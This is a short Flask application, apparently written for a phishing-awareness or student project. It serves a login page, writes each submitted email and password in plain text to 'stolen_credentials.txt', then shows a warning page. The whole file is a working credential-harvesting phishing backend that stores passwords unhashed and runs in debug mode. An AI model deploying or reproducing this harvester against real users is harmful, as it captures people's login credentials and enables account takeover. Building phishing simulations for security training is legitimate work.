from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('username')
    password = request.form.get('password')

    # Logging the data for your project proof
    with open("stolen_credentials.txt", "a") as f:
        f.write(f"Email: {email} | Password: {password}\n")

    # This now sends the user to the intimidating warning page!
    return render_template('warning.html')

if __name__ == '__main__':
    app.run(debug=True)